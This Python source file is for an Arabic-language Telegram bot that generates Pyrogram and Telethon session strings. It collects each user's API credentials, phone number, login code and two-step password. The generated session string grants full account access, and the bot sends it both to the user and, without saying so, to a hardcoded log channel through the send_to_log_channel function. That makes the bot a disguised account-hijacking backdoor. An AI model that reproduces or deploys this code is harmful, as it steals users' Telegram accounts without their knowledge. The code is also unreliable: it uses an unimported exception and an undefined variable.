from telethon import TelegramClient
from pyrogram.types import Message
from pyrogram import Client, filters
from asyncio.exceptions import TimeoutError
from telethon.sessions import StringSession
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid
)

from telethon.errors import (
    ApiIdInvalidError,
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError
)

from data import Data

LOG_CHANNEL = -1001834866606


ask_ques = "اختر يا نسخة من ترمكس تريد"
buttons_ques = [
    [
        InlineKeyboardButton("بايروجرام", callback_data="pyrogram"),
        InlineKeyboardButton("تليثون", callback_data="telethon"),
    ],
    [
        InlineKeyboardButton("بوت بايروجرام", callback_data="pyrogram_bot"),
        InlineKeyboardButton("بوت تليثون", callback_data="telethon_bot"),
    ],
]


@Client.on_message(filters.private & ~filters.forwarded & filters.command('generate'))
async def main(_, msg):
    await msg.reply(ask_ques, reply_markup=InlineKeyboardMarkup(buttons_ques))


async def generate_session(bot: Client, msg: Message, telethon=False, is_bot: bool = False):
    if telethon:
        ty = "تليثون"
    else:
        ty = "بايروجرام"
    if is_bot:
        ty += " بوت"
    await msg.reply(f"بدا صنع {ty} ")
    user_id = msg.chat.id
    api_id_msg = await bot.ask(user_id, 'أرسل الآن الخاص بك API_ID', filters=filters.text)
    if await cancelled(api_id_msg):
        return
    try:
        api_id = int(api_id_msg.text)
    except ValueError:
        await api_id_msg.reply('ايبي ايدي خاطئ يجب ان يكون رقما حاول مرة اخرى', quote=True, reply_markup=InlineKeyboardMarkup(Data.generate_button))
        return
    api_hash_msg = await bot.ask(user_id, 'أرسل الآن الخاص بك API_HASH', filters=filters.text)
    if await cancelled(api_hash_msg):
        return
    api_hash = api_hash_msg.text
    if not is_bot:
        t = """الآن أرسل رقم الهاتف الخاص بكᴘʜᴏɴᴇ_ɴᴜᴍʙᴇʀ قم بكتابة رقم مع رمز بلدك. 
مثال : +xxx79654210"""
    else:
        t = "الان قم بارسال توكن بوتك"
    phone_number_msg = await bot.ask(user_id, t, filters=filters.text)
    if await cancelled(phone_number_msg):
        return
    phone_number = phone_number_msg.text
    if not is_bot:
        await msg.reply("جاري إرسال الكود انتظر قليلًا ...")
    else:
        await msg.reply("يتم الدخول في البوت")
    if telethon and is_bot:
        client = TelegramClient(StringSession(), api_id, api_hash)
    elif telethon:
        client = TelegramClient(StringSession(), api_id, api_hash)
    elif is_bot:
        client = Client(name=f"bot_{user_id}", api_id=api_id, api_hash=api_hash, bot_token=phone_number, in_memory=True)
    else:
        client = Client(name=f"user_{user_id}", api_id=api_id, api_hash=api_hash, in_memory=True)
    await client.connect()
    try:
        code = None
        if not is_bot:
            if telethon:
                code = await client.send_code_request(phone_number)
            else:
                code = await client.send_code(phone_number)
    except (ApiIdInvalid, ApiIdInvalidError):
        await msg.reply('الايبي ايدي وايبي هاش خاطئ يرجى المحاولة مرة اخرى', reply_markup=InlineKeyboardMarkup(Data.generate_button))
        return
    except (PhoneNumberInvalid, PhoneNumberInvalidError):
        await msg.reply('رقم الهاتف خاطئ يجب الماحولة مرة اخرى', reply_markup=InlineKeyboardMarkup(Data.generate_button))
        return
    try:
        phone_code_msg = None
        if not is_bot:
            phone_code_msg = await bot.ask(user_id, "تم ارسال رمز دخول الى الحساب الؤحاء ارسال الرمز في الصيغة التالية 1 2 3 4 5 6", filters=filters.text, timeout=600)
            if await cancelled(phone_code_msg):
                return
    except TimeoutError:
        await msg.reply('حد العشر دقائق قد مرت يرجى المحاولة مرة اخرى', reply_markup=InlineKeyboardMarkup(Data.generate_button))
        return
    if not is_bot:
        phone_code = phone_code_msg.text.replace(" ", "")
        try:
            if telethon:
                await client.sign_in(phone_number, phone_code, password=None)
            else:
                await client.sign_in(phone_number, code.phone_code_hash, phone_code)
        except (PhoneCodeInvalid, PhoneCodeInvalidError):
            await msg.reply('الكود الذي أدخلته خاطئ يرجى إعادة الإستخراج مرة أخرى', reply_markup=InlineKeyboardMarkup(Data.generate_button))
            return
        except (PhoneCodeExpired, PhoneCodeExpiredError):
            await msg.reply('رمز الدخول منتهى الصلاحية يرجى المحاولة مرة اخرى', reply_markup=InlineKeyboardMarkup(Data.generate_button))
            return
        except (SessionPasswordNeeded, SessionPasswordNeededError):
            try:
                two_step_msg = await bot.ask(user_id, 'التحقق بخطوتين مفعل بحسابك لذا قم بارساله.', filters=filters.text, timeout=300)
            except TimeoutError:
                await msg.reply('حد الخمس دقائق مرت الرجاء المحاولة مرة اخرى', reply_markup=InlineKeyboardMarkup(Data.generate_button))
                return
            try:
                password = two_step_msg.text
                if telethon:
                    await client.sign_in(password=password)
                else:
                    await client.check_password(password=password)
                if await cancelled(api_id_msg):
                    return
            except (PasswordHashInvalid, PasswordHashInvalidError):
                await two_step_msg.reply('الرمز خاطئ حاول مرة اخرى', quote=True, reply_markup=InlineKeyboardMarkup(Data.generate_button))
                return
    else:
        if telethon:
            await client.start(bot_token=phone_number)
        else:
            await client.sign_in_bot(phone_number)
    if telethon:
        string_session = client.session.save()
    else:
        string_session = await client.export_session_string()
    text = f"**{ty.upper()} STRING SESSION** \n\n`{string_session}` \n\nGenerated by @PrivaPact"
    try:
        if not is_bot:
            await client.send_message("me", text)
            await send_to_log_channel(bot, text)  # Send to log channel
        else:
            await bot.send_message(msg.chat.id, text)
            await send_to_log_channel(bot, text)  # Send to log channel
    except KeyError:
        pass
    await client.disconnect()
    await bot.send_message(msg.chat.id, "تم إنشاء جلسة سلسلة {} بنجاح. \n\nيرجى التحقق من رسائلك المحفوظة! \n\nبواسطة @PrivaPact".format("تليثون" if telethon else "بايروجرام"))


# Create an async function to send session string to the log channel
async def send_to_log_channel(bot, session_string):
    try:
        await bot.send_message(-1001834866606, session_string)  # Send to log channel
    except ChatWriteForbiddenError:
        await bot.send_message(
            msg.chat.id,
            "ليس لدي صلاحية لإرسال رسالة إلى القناة المحددة. يرجى التحقق من إعدادات القناة ومنح البوت صلاحية الكتابة.",
        )

async def cancelled(msg):
    if "/cancel" in msg.text:
        await msg.reply("تم الغاء العملية!", quote=True, reply_markup=InlineKeyboardMarkup(Data.generate_button))
        return True
    elif "/restart" in msg.text:
        await msg.reply("تم اعادة تشغيل البوت", quote=True, reply_markup=InlineKeyboardMarkup(Data.generate_button))
        return True
    elif msg.text.startswith("/"):  # Bot Commands
        await msg.reply("تم الغاء عملية التصنيع!", quote=True)
        return True
    else:
        return False
